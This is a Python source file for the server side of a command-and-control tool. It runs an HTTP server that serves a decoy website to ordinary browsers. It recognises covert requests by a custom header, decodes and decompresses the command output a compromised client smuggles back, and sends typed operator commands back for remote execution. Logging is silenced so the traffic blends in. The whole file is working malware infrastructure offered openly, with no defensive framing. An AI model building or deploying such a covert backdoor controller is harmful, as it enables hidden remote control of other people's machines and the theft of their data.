'''
Executes on the C2 server. Runs an HTTP server that listens for requests from the client.

Assumes only one client connects.
'''

# from urllib import request, parse
from http.server import SimpleHTTPRequestHandler, HTTPServer
import base64
import zlib
import threading
from queue import Queue
import time
from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, RequestFlags

WEB_DIRECTORY = 'web' # Root directory of website files.

# The inputs entered by the user, to be sent to the client to be executed (the `queue` library is thread-safe)
user_inputs = Queue()
# The current message being formed via requests from the client. Only print when the complete message is formed.
current_message_encoded_strs = Queue()

    
def get_original_message(encoded_message: str, request_flags: RequestFlags):
    # 1. Decode
    decoded_bytes = base64.b64decode(encoded_message)
    # 2. Decompress (unless it's not compressed)
    decompressed_bytes = decoded_bytes
    if RequestFlags.IS_NOT_COMPRESSED not in request_flags:
        decompressed_bytes = zlib.decompress(decoded_bytes)
    # 3. Unencrypt
    unencrypted_bytes = decompressed_bytes # TODO
    return unencrypted_bytes.decode()

def wait_for_user_input():
    global user_inputs
    # Wait for user input.
    while (user_inputs.empty()):
        time.sleep(1)


class RequestHandler(SimpleHTTPRequestHandler):
    '''
    Instantiated on each HTTP request to handle the request.
    '''
    def __init__(self, *args, **kwargs):
        # Set directory to be the web directory
        super().__init__(*args, directory=WEB_DIRECTORY, **kwargs)
    
    def log_message(self, format, *args):
        pass # Do nothing (silences logs)

    def is_stego_request(self):
        '''
        Check if this request is steganographic communication from the client
        or just a normal request from a browser.
        '''
        # Check if stego header is present.
        return self.headers.get(STEGO_HEADER_NAME)

    def get_request_encoded_str(self):
        ''''
        Get encoded str from request, excluding flags
        '''
        return self.headers.get(STEGO_HEADER_NAME)
    
    def get_request_flags(self):
        # TODO
        flags = RequestFlags(0)
        if self.headers.get("IS_NOT_COMPRESSED"):
            flags |= RequestFlags.IS_NOT_COMPRESSED
        if self.headers.get("IS_END_OF_MESSAGE"):
            flags |= RequestFlags.IS_END_OF_MESSAGE
        return flags

    def serve_normal_web_content(self):
        '''
        Serves 'normal' HTML pages from the website, not used for steganographic communication.
        '''
        if self.path == '/':
            self.path = '/index.html'
        self.path = self.directory + self.path
        try:
            with open(self.path, "r") as f:
                file_content = f.read()
            self.send_response(200)
        except:
            file_content = 'File not found.'
            self.send_response(404)
        self.end_headers()
        self.wfile.write(bytes(file_content, 'utf-8'))

    def send_user_input_response(self):
        '''
        Send a steganographic response containing user input
        '''
        self.send_response(200)
        self.end_headers()
        # Write user input to HTML file contents (TODO: use image steganography instead)
        self.wfile.write(user_inputs.get().encode())
    
    def send_dummy_response(self):
        '''
        Send a normal website response NOT containing any steganographic content
        '''
        self.serve_normal_web_content()

    def do_GET(self):
        # Check if request is steganographic communication or just regular browser traffic.
        if not self.is_stego_request():
            self.serve_normal_web_content()
            return    
        # TODO
        # if empty request, print
        # if not empty request, if not last message, append to queue
            # if last message, if compressed, decompress. Then, print

        encoded_str = self.get_request_encoded_str()
        if len(encoded_str) == 0:
            print("\n\n")
            wait_for_user_input()
            self.send_user_input_response()
            return
        
        global current_message_encoded_strs
        current_message_encoded_strs.put(encoded_str)
        request_flags = self.get_request_flags()

        # Check if this steganographic request is the last one in message, or if more requests are incoming.
        if RequestFlags.IS_END_OF_MESSAGE not in request_flags:
            self.send_dummy_response()
            return
        encoded_full_message = ""
        while not current_message_encoded_strs.empty():
            encoded_full_message += current_message_encoded_strs.get()
        current_message_encoded_strs = Queue() # Reset queue
        # Display command output from client machine
        print("\n" + get_original_message(encoded_full_message,  request_flags) + "\n")
        wait_for_user_input()
        self.send_user_input_response()
        


def run_http_server():
    server_address = (LISTENER_IP, LISTENER_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()

def main():
    # Run the http server in a background thread.
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True # Ensures thread ends on main program exit.
    server_thread.start()
    while(True):
        global user_inputs
        user_inputs.put(input())

if __name__ == '__main__':
    main()